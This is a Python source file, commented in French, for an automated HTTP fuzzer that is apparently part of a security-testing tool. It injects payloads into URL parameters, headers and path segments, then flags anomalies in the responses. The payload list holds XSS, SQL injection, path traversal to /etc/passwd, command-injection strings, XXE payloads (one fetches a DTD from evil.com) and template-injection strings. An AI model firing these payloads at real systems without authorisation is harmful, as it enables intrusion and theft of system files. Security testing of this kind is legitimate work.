"""Fuzzer paramétrique — injection automatisée de payloads dans tous les points d'entrée.

Modes :
- Paramètres GET/POST
- En-têtes HTTP
- Corps JSON / XML / form-data
- Path segments
"""

import asyncio
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from decepticon.navmax.core.logging import get_logger

logger = get_logger(__name__)


# ---------------------------------------------------------------------------
# Payloads de fuzzing (classés par catégorie)
# ---------------------------------------------------------------------------
FUZZ_PAYLOADS: dict[str, list[str]] = {
    "xss": [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>",
        "';alert(1);//",
        "<svg/onload=alert(1)>",
    ],
    "sqli": [
        "'",
        "' OR 1=1--",
        '" OR 1=1--',
        "1' AND 1=1--",
        "1' ORDER BY 10--",
        "1 UNION SELECT 1,2,3--",
        "' OR SLEEP(0.1)--",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd%00",
        "....//....//....//etc/passwd",
    ],
    "command_injection": [
        # Séparateurs de base
        "; ls -la",
        "| whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "&& dir C:\\",
        "| dir C:\\",
        # Séparateurs additionnels
        "; id",
        "| id",
        "& whoami",
        "|| whoami",
        "`ls`",
        "&& whoami",
        # Commandes Unix supplémentaires
        "| cat /etc/hosts",
        "; cat /etc/hosts",
        "`cat /etc/passwd`",
        "$(id)",
        "& ping -c 1 127.0.0.1 &",
        # Commandes Windows
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
        # Encodage URL (simple)
        "%3B%20id",
        "%7C%20id",
        "%3Bcat%20/etc/passwd",
        # Double encodage URL
        "%253B%2520id",
        "%257C%2520id",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>',
        '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]>',
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__}}",
    ],
    "overflow": [
        "A" * 1000,
        "A" * 10000,
        "%s%s%s%s%s%s%s%s%s%s" * 100,
        "-1",
        "99999999999999999999",
        "NaN",
        "Infinity",
    ],
    "format_string": [
        "%s%s%s%s",
        "%x%x%x%x",
        "%n%n%n%n",
    ],
    "special_chars": [
        "\x00",
        "\r\n",
        "\\x00",
        "\\u0000",
        "&#0;",
        "%00",
    ],
}


@dataclass
class FuzzResult:
    """Résultat d'un test de fuzzing."""

    url: str
    injection_point: str  # parameter | header | path
    parameter_name: str
    payload: str
    payload_category: str
    original_status: int
    fuzz_status: int
    response_length_diff: int
    response_time_diff_ms: float
    anomaly: str | None = None  # Description de l'anomalie
    evidence: str | None = None


@dataclass
class FuzzReport:
    """Rapport complet de fuzzing."""

    url: str
    total_tests: int
    anomalies: list[FuzzResult] = field(default_factory=list)
    duration_ms: float = 0.0

    @property
    def anomaly_count(self) -> int:
        return len(self.anomalies)

    @property
    def critical_count(self) -> int:
        return len([a for a in self.anomalies if "erreur" in (a.anomaly or "").lower()])


class Fuzzer:
    """Fuzzer HTTP paramétrique.
    Injecte des payloads dans tous les points d'entrée et détecte les anomalies.
    """

    def __init__(
        self,
        timeout: float = 10.0,
        concurrency: int = 10,
        categories: list[str] | None = None,
    ) -> None:
        self.timeout = timeout
        self.concurrency = concurrency
        self.categories = categories or list(FUZZ_PAYLOADS.keys())
        self._client: httpx.AsyncClient | None = None
        self._semaphore: asyncio.Semaphore | None = None

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None:
            self._client = httpx.AsyncClient(
                verify=False,
                timeout=httpx.Timeout(self.timeout),
                follow_redirects=False,
                headers={"User-Agent": "NavMAX-Fuzzer/0.1"},
            )
        return self._client

    async def close(self) -> None:
        if self._client:
            await self._client.aclose()
            self._client = None

    async def fuzz_url(
        self,
        url: str,
        method: str = "GET",
        headers: dict[str, str] | None = None,
        body: str | None = None,
    ) -> FuzzReport:
        """Fuzze une URL complète.

        Args:
            url: URL à fuzzer
            method: GET, POST, PUT, etc.
            headers: En-têtes à inclure
            body: Corps pour POST/PUT

        """
        t0 = time.monotonic()
        client = await self._get_client()
        self._semaphore = asyncio.Semaphore(self.concurrency)

        report = FuzzReport(url=url, total_tests=0)

        # 1. Établir une baseline (requête normale)
        baseline = await self._send_baseline(client, url, method, headers, body)
        report.total_tests += 1

        # 2. Collecter les points d'injection
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        header_names = list((headers or {}).keys())
        path_segments = [s for s in parsed.path.split("/") if s and not s.startswith(".")]

        # 3. Fuzzer les paramètres GET
        tasks = []
        for param_name in params:
            for category in self.categories:
                for payload in FUZZ_PAYLOADS.get(category, []):
                    tasks.append(
                        self._fuzz_param(
                            client,
                            url,
                            method,
                            param_name,
                            payload,
                            category,
                            baseline,
                            "parameter",
                        ),
                    )
        report.total_tests += len(tasks)

        # 4. Fuzzer les en-têtes
        for header_name in header_names:
            for category in self.categories:
                for payload in FUZZ_PAYLOADS.get(category, [])[:3]:  # Limiter les headers
                    tasks.append(
                        self._fuzz_header(
                            client,
                            url,
                            method,
                            header_name,
                            payload,
                            category,
                            baseline,
                            headers,
                        ),
                    )
        report.total_tests += len(tasks)

        # 5. Fuzzer les segments de chemin
        for _i, _segment in enumerate(path_segments[:5]):  # Max 5 segments
            for payload in FUZZ_PAYLOADS.get("path_traversal", [])[:3]:
                tasks.append(
                    self._fuzz_path(
                        client,
                        parsed,
                        _i,
                        payload,
                        baseline,
                    ),
                )
        report.total_tests += len(tasks)

        # 6. Exécuter tous les tests
        results: list[FuzzResult | None] = await asyncio.gather(*tasks, return_exceptions=True)

        anomalies = [r for r in results if isinstance(r, FuzzResult) and r.anomaly]
        report.anomalies = anomalies
        report.duration_ms = (time.monotonic() - t0) * 1000

        logger.info(
            "fuzz_terminé",
            url=url[:80],
            tests=report.total_tests,
            anomalies=len(anomalies),
            duration_ms=round(report.duration_ms, 0),
        )

        return report

    # ------------------------------------------------------------------
    # Méthodes internes
    # ------------------------------------------------------------------
    async def _send_baseline(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        headers: dict[str, str] | None,
        body: str | None,
    ) -> dict[str, Any]:
        """Établit une baseline (réponse normale)."""
        try:
            resp = await client.request(
                method=method,
                url=url,
                headers=headers,
                content=body,
            )
            return {
                "status": resp.status_code,
                "length": len(resp.content),
                "headers": dict(resp.headers),
            }
        except (httpx.TimeoutException, httpx.RequestError, OSError):
            return {"status": 0, "length": 0, "headers": {}}

    async def _fuzz_param(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        param: str,
        payload: str,
        category: str,
        baseline: dict,
        injection_type: str,
    ) -> FuzzResult | None:
        """Teste un payload sur un paramètre GET/POST."""
        async with self._semaphore:  # type: ignore[union-attr]
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            test_params = dict(params)
            test_params[param] = [payload]

            new_parsed = parsed._replace(query=urlencode(test_params, doseq=True))
            test_url = urlunparse(new_parsed)

            return await self._do_fuzz_request(
                client,
                test_url,
                method,
                baseline,
                param,
                payload,
                category,
                injection_type,
            )

    async def _fuzz_header(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        header_name: str,
        payload: str,
        category: str,
        baseline: dict,
        original_headers: dict[str, str] | None,
    ) -> FuzzResult | None:
        """Teste un payload sur un en-tête HTTP."""
        async with self._semaphore:  # type: ignore[union-attr]
            headers = dict(original_headers or {})
            headers[header_name] = payload

            return await self._do_fuzz_request(
                client,
                url,
                method,
                baseline,
                header_name,
                payload,
                category,
                "header",
                extra_headers=headers,
            )

    async def _fuzz_path(
        self,
        client: httpx.AsyncClient,
        parsed: urlparse,
        segment_index: int,
        payload: str,
        baseline: dict,
    ) -> FuzzResult | None:
        """Teste un payload sur un segment de chemin."""
        async with self._semaphore:  # type: ignore[union-attr]
            segments = parsed.path.split("/")
            actual_idx = segment_index + 1  # skip le premier "/" vide
            if actual_idx >= len(segments):
                return None

            original = segments[actual_idx]
            segments[actual_idx] = payload
            new_path = "/".join(segments)
            new_parsed = parsed._replace(path=new_path)
            test_url = urlunparse(new_parsed)

            return await self._do_fuzz_request(
                client,
                test_url,
                "GET",
                baseline,
                original,
                payload,
                "path_traversal",
                "path",
            )

    async def _do_fuzz_request(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        baseline: dict,
        param_name: str,
        payload: str,
        category: str,
        injection_type: str,
        extra_headers: dict[str, str] | None = None,
    ) -> FuzzResult:
        """Exécute une requête de fuzzing et détecte les anomalies."""
        t0 = time.monotonic()
        try:
            resp = await client.request(
                method=method,
                url=url,
                headers=extra_headers,
            )
            elapsed = time.monotonic() - t0
        except (httpx.TimeoutException, httpx.RequestError, OSError) as e:
            return FuzzResult(
                url=url,
                injection_point=injection_type,
                parameter_name=param_name,
                payload=payload[:100],
                payload_category=category,
                original_status=baseline.get("status", 0),
                fuzz_status=0,
                response_length_diff=0,
                response_time_diff_ms=0,
                anomaly=f"Erreur de connexion : {e}",
            )

        result = FuzzResult(
            url=url,
            injection_point=injection_type,
            parameter_name=param_name,
            payload=payload[:100],
            payload_category=category,
            original_status=baseline.get("status", 0),
            fuzz_status=resp.status_code,
            response_length_diff=len(resp.content) - baseline.get("length", 0),
            response_time_diff_ms=round(elapsed * 1000, 1),
        )

        # Détection d'anomalies
        anomalies = self._detect_anomalies(result, resp, baseline)
        if anomalies:
            result.anomaly = anomalies[0]
            result.evidence = anomalies[1] if len(anomalies) > 1 else None

        return result

    def _detect_anomalies(
        self,
        result: FuzzResult,
        resp: httpx.Response,
        baseline: dict,
    ) -> list[str]:
        """Détecte les anomalies dans une réponse de fuzzing."""
        anomalies: list[str] = []

        # 1. Changement de code HTTP (500, 502, 503)
        if baseline.get("status", 200) < 400 and result.fuzz_status >= 500:
            anomaly = f"Erreur serveur (HTTP {result.fuzz_status})"
            evidence = resp.text[:200]
            anomalies = [anomaly, evidence]

        # 2. Augmentation drastique du temps de réponse
        if result.response_time_diff_ms > 2000:
            anomalies.append(f"Temps de réponse anormal : {result.response_time_diff_ms:.0f}ms")
            anomalies.append(resp.text[:200])

        # 3. Changement significatif de la taille de réponse
        if abs(result.response_length_diff) > 5000:
            anomalies.append(
                f"Taille de réponse anormale (diff: {result.response_length_diff:+d} octets)",
            )

        # 4. Réflexion du payload (potentiel XSS)
        if result.payload in resp.text and result.payload_category == "xss":
            anomalies = [
                "Payload XSS reflété dans la réponse",
                f"Payload: {result.payload[:50]}",
            ]

        # 5. Erreur SQL dans la réponse
        sql_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"ORA-[0-9]",
            r"unclosed quotation",
            r"ODBC Driver",
        ]
        import re

        for pat in sql_patterns:
            if re.search(pat, resp.text, re.IGNORECASE):
                anomalies = [
                    "Erreur SQL détectée dans la réponse",
                    f"Pattern: {pat}",
                ]

        # 6. Preuve d'exécution de commande dans la réponse (command_injection)
        if result.payload_category == "command_injection":
            cmd_exec_patterns = [
                r"uid=\d+",  # Unix id (uid=1000)
                r"root:.*?:0:0:",  # /etc/passwd root entry
                r"bin:.*?:1:1:",  # /etc/passwd bin entry
                r"Volume Serial Number",  # Windows DIR
                r"Directory of ",  # Windows DIR
                r"r[-wxsStT-]{8}\s+\d+",  # Permissions Unix (rwxr-xr-x)
                r"total \d+",  # ls -la header
                r"\d+ \w{3,9} \d+ \d{2}:\d{2}",  # Date style ls -la
                r"126\.0\.0\.1",  # Loopback erroné (signe injection)
            ]
            for pat in cmd_exec_patterns:
                if re.search(pat, resp.text):
                    anomalies = [
                        "Exécution de commande détectée dans la réponse",
                        f"Pattern: {pat}",
                    ]
                    break

            # 7. Variation de taille de réponse pour command_injection (> 100 octets)
            if not anomalies and abs(result.response_length_diff) > 100:
                anomalies = [
                    f"Variation de taille suspecte pour command_injection (diff: {result.response_length_diff:+d} octets)",
                    "",
                ]

        return anomalies
